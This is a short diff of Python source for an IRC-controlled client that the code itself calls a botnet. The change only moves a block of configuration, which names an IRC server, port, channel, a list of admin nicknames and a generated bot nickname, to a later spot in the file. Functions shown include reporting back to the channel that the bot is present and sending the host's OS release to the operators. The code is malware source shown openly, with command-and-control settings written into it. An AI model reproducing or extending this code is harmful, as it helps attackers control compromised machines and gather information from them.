@@ -54,19 +54,6 @@ def sendData(data):
 	else:
 		irc.send('PRIVMSG ' + channel + " :" + data + '\r\n')
 
-#debugger
-DEBUG = 0
-if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
-	DEBUG = 1
-
-#IRC Settings
-admins = ["king", "samorizu", "blackbear", "bigshebang"]
-server = "leagueachieve.info"
-port = 6667
-channel = "#lobby"
-botnick = genNick()
-
-print "The botnick is:", botnick
 
 #All of the possible functions that the botnet is capable of
 def reply(): #send back to IRC server that you are here
@@ -96,6 +83,20 @@ def uptime():
 
 def info():
 	sendData(platform.release())
+
+#debugger
+DEBUG = 0
+if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
+	DEBUG = 1
+
+#IRC Settings
+admins = ["king", "samorizu", "blackbear", "bigshebang"]
+server = "leagueachieve.info"
+port = 6667
+channel = "#lobby"
+botnick = genNick()
+
+print "The botnick is:", botnick
 
 #dictionary of functions
 commands = {
